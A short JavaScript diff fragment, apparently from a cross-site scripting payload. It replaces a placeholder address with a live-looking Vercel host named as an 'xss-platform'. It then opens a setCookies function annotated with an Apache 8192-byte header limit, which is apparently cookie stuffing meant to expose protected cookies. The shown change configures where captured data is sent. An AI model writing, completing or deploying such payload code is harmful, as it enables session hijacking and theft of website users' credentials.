@@ -1,4 +1,4 @@
-var website="http://网站地址";
+var website="https://vercel-xss-platform-felf-puhl3hvtd-superbigs-projects.vercel.app/";
 function setCookies() {
     /*apache server limit 8192*/
     var str = "";
